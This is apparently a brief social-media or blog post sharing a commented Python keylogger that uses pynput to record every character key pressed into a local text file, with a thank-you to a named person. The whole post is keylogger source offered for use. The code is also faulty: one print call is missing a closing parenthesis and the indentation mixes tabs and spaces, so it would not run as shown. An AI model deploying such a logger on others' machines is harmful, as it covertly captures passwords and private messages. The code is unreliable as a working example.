Shoutout to Shaun Halverson!! 🙌🏻💐

# This library allows you to control and monitor input devices:
from pynput import keyboard 

# When a key is pressed the parameter "key" will keep the value
def keyPressed(key):
    # Print which key was pressed (converting it into a string)
    print(str(key)
    # Open file Keyfile.txt as append, which means that everytime a key is pressed, it will be added to the end of the file.
    with open("Keyfile.txt", 'a') as logKey:
	# If a character key is pressed ("a", "1") the value will be the key as a string 
	try:
	     char = key.char
	     # If it is extracted safely, it will be written in the file txt
	     logKey.write(char)
 	     # Otherwise if an error accure the exception will be kept and it will exibit an error message:
	except:
	     print("Error getting char")

# To verify that the script will be executed directely
if __name__ == "__main__":
   # The value "listener" will monitor the keys that are pressed and call "keyPressed" function:
   listener = keyboard.Listener(on_press=keyPressed)
   # It will execute in the background
   listener.start()
   input()
